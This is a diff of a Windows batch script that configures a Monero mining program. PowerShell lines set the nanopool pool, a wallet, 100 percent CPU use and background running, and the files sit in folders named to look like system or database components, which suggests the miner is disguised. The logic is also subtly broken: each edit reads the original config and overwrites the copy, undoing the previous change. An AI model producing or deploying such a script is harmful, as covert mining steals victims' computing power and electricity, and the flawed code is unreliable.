@@ -296,13 +296,13 @@ if not [%EMAIL%] == [] (
   set "%EMAIL%"
 )
 
+powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"algo\": *null,', '\"algo\": rx/0,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\myssqltcp\config.json'" 
 powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"xmr-us-west1.nanopool.org:%PORT%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\myssqltcp\config.json'" 
 powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%WALLET%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\myssqltcp\config.json'" 
 powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\myssqltcp\config.json'" 
 powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 100,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\myssqltcp\config.json'" 
 set LOGFILE2=%LOGFILE:\=\\%
 powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"log-file\": *null,', '\"log-file\": \"%LOGFILE2%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\myssqltcp\config.json'" 
-
 copy /Y "%USERPROFILE%\netsys\config.json" "%USERPROFILE%\netsys\config_background.json" >NUL
 powershell -Command "$out = cat '%USERPROFILE%\netsys\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\myssqltcp\config_background.json'" 
 
